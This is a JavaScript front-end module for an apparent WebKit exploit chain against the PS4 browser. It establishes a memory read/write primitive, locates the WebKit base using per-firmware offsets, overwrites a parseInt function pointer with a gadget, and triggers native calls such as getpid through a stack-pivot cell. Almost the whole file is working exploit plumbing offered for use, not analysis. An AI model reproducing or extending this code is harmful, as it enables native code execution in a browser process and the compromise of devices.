/** Minimal UI for core_native.js — parseInt + textarea path only. */
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { establishPrimitive, trimExploitDebris, getCoreNative } from "./core.js?v=core-4";
import {
    prepCoreNative, fireCoreSmoke, fireCoreGetpid, bisectCoreTriggerLite,
} from "./core_native.js";

const BUILD = "core-page-1";
let lines = [], ready = false, busy = false, prep = null;

function $(id) { return document.getElementById(id); }
function log(tag, d) {
    const line = tag + (d ? "  " + d : "");
    lines.push(line);
    if (lines.length > 100) lines.shift();
    try {
        const p = sessionStorage.getItem("wk-core-log") || "";
        sessionStorage.setItem("wk-core-log", (p ? p + "\n" : "") + line);
    } catch (_) { }
    const o = $("out");
    if (o) { o.textContent = lines.join("\n"); o.scrollTop = o.scrollHeight; }
}
function state(msg, cls) {
    const s = $("state");
    if (s) { s.textContent = msg; s.className = cls || ""; }
}

function parseAddr(raw) {
    if (!raw) return null;
    let s = String(raw).replace(/^0x/i, "").trim();
    if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
}

function lkFromFn(raw) {
    const p = parseAddr(raw);
    if (!p) return null;
    if ((p.low & 0x3fff) === 0 && p.hi >= 0x80) return p;
    return p.sub32(0x13b20);
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    log("BOOT", BUILD);
    try {
        const carrier = await establishPrimitive({
            maxAttempts: 0,
            skipTrimDebris: true,
            onEvent: (t, d) => { if (/PRIMITIVE|FAIL|ERROR|HOLDER|READ-PRIMITIVE/i.test(t)) log(t, d || ""); },
        });
        installWindowP(carrier, { promote: false });
        window._wkCarrier = carrier;
        if (!carrier.native) {
            const nat = getCoreNative(carrier);
            if (nat) carrier.native = nat;
        }
        const p = window.p;
        if (!p) throw new Error("no p");
        try { trimExploitDebris(); } catch (_) { }
        if (pairStatus.state === "broken") throw new Error("pair broken");

        const off = offsetsFor(navigator.userAgent).off;
        prep = prepCoreNative(p, off, carrier);
        const cap = prep._cap || {};
        log("CORE-NATIVE", "path=" + (cap.path || "?")
            + " mainMf=" + prep.mainMf
            + " wb=" + prep.webkitBase
            + " pivotCell=" + prep.pivotCell);
        ready = true;
        state("core prep OK", "ok");
        $("btn-n5a").disabled = false;
        $("btn-smoke").disabled = false;
        $("btn-accept").disabled = false;
    } catch (e) {
        log("FAIL", e.message || String(e));
        state("failed", "bad");
    } finally {
        busy = false;
    }
}

function runN5a() {
    if (busy || !prep) return;
    busy = true;
    log("N5a", "parseInt(1) G0 armed no hook");
    try {
        if (!prep.mainArmed) {
            window.p.write8(prep.mainMf, prep.G.G0);
            prep.mainArmed = true;
        }
        bisectCoreTriggerLite(window.p, prep);
        log("N5a-OK", "survived");
        state("N5a OK", "ok");
    } catch (e) {
        log("N5a-OOM", e.message || String(e));
        state("N5a OOM", "bad");
    } finally {
        busy = false;
    }
}

function runSmoke() {
    if (busy || !prep) return;
    busy = true;
    try {
        fireCoreSmoke(window.p, prep, offsetsFor(navigator.userAgent).off, "cell30");
        log("SMOKE-OK", "survived");
        state("smoke OK", "ok");
    } catch (e) {
        log("SMOKE-FAIL", e.message || String(e));
        state("smoke fail", "bad");
    } finally {
        busy = false;
    }
}

function runGetpid() {
    if (busy || !prep) return;
    const lk = lkFromFn($("fn-in").value.trim());
    if (!lk) { log("SKIP", "need fn ptr"); return; }
    busy = true;
    try {
        const off = offsetsFor(navigator.userAgent).off;
        const r = fireCoreGetpid(window.p, prep, lk, off, "cell30", {
            getpidMode: new URLSearchParams(location.search).get("getpid") || "auto",
        });
        log("GETPID", r.mode === "raw"
            ? "pid=" + r.ret + " stub+0x" + r.stubOff.toString(16)
            : "wrap-ret=" + r.ret);
        state(r.ok
            ? (r.mode === "raw" ? "getpid pid=" + r.ret : "getpid wrap OK")
            : "getpid ret=" + r.ret, r.ok ? "ok" : "warn");
    } catch (e) {
        log("FAIL", e.message || String(e));
        state("fail", "bad");
    } finally {
        busy = false;
    }
}

function init() {
    try {
        const prev = sessionStorage.getItem("wk-core-log");
        if (prev) lines = prev.split("\n").slice(-80);
    } catch (_) { }
    $("out").textContent = lines.join("\n");
    $("btn-start").onclick = runStart;
    $("btn-n5a").onclick = runN5a;
    $("btn-smoke").onclick = runSmoke;
    $("btn-getpid").onclick = runGetpid;
    $("btn-accept").onclick = function () {
        const v = $("fn-in").value.trim();
        if (v) try { sessionStorage.setItem("wk-lastFnPtr", v); } catch (_) { }
        runGetpid();
    };
    const saved = sessionStorage.getItem("wk-lastFnPtr");
    if (saved) $("fn-in").value = saved;
}

init();
